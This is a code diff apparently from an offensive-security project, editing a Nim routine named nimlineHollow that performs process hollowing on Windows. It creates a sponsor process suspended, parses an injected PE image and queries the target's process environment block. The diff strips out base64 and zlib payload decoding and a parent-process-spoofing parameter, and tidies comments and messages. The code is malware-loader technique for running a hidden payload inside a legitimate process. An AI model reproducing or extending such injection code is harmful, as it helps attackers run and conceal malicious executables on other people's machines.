@@ -1,17 +1,12 @@
-import utils
 import winim
 import ptr_math
 import std/strutils
-from zip/zlib import uncompress
+
 include syscalls
 
 
-proc nimlineHollow*(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0): bool =
+proc nimlineHollow*(peStr: string, sponsorCmd: LPCSTR): bool =
 
-    # Decode and decompress PE
-    var compressedPe = decode64(compressedBase64PE, is_bin=true)
-    var peStr = uncompress(compressedPe)
-    
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
@@ -23,7 +18,7 @@ proc nimlineHollow*(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
     
-     # Create sponsor process suspended
+    # Create sponsor process suspended
     when not defined(release): echo "[*] Creating sponsor process suspended" 
     var si: STARTUPINFOA
     var pi: PROCESS_INFORMATION
@@ -61,7 +56,7 @@ proc nimlineHollow*(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 
         cast[windef.ULONG](sizeof(bi)),
         addr ret
     ) != 0:
-        when not defined(release): echo "[-] Could query sponsor process"   
+        when not defined(release): echo "[-] Could not query sponsor process"   
         quit()
     
     let sponsorPeb = bi.PebBaseAddress
